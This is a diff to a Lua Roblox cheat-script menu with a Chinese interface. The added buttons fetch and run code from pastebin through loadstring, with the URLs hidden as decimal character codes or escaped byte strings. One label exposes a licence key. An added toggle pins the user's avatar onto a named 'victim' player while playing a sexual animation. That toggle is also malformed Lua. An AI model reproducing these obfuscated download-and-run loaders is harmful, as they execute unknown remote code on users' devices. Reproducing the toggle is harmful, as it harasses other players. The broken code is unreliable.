@@ -76,7 +76,7 @@ Tab:AddButton({
 })
  
 Tab:AddButton({
-	Name = "复制yyQQ号",
+	Name = "复制QQ号",
 	Callback = function()
 setclipboard("3334964")
 end
@@ -276,6 +276,20 @@ Tab:AddToggle({
     end
   end
 })
+Tab:AddToggle({
+  Name = "FE性爱"
+  Callback = function()
+local Victim='Player name here'
+local A=Instance.new'Animation'
+A.AnimationId='rbxassetid://148840371'
+local P=game:GetService'Players'.LocalPlayer
+local C=P.Character or P.CharacterAdded:Wait()
+local H=C:WaitForChild'Humanoid':LoadAnimation(A)
+H:Play()
+H:AdjustSpeed(2.5)
+game:GetService'RunService'.Stepped:Connect(function()
+    C:WaitForChild'HumanoidRootPart'.CFrame=CFrame.new(game:GetService'Players':FindFirstChild(Victim).Character:WaitForChild'HumanoidRootPart'.Position)
+end)
 Tab:AddButton({
   Name = "阿尔宙斯UI",
   Default = false,
@@ -697,6 +711,27 @@ Tab:AddButton({
   end
 })
 
+Tab:AddButton({
+	Name = "自制脚本",
+	Callback = function()
+  getgenv().yczgqffg="自制脚本" loadstring(game:HttpGet(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,122,110,67,121,54,89,77,81})end)())))()
+  	end
+})
+
+Tab:AddButton({
+	Name = "eom脚本",
+	Callback = function()
+  getgenv().eom = "eom"
+loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\68\122\120\115\81\82\68\85\39\41\41\40\41")()
+  	end
+})
+
+Tab:AddButton({
+	Name = "BS脚本卡密:195154ajd",
+	Callback = function()
+  loadstring(game:HttpGet(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,71,57,103,117,122,88,100,75})end)())))()--BS
+  	end
+})
 local Tab = Window:MakeTab({
     Name = "特殊脚本（可能无效）",
 	Icon = "rbxassetid://4483345998",
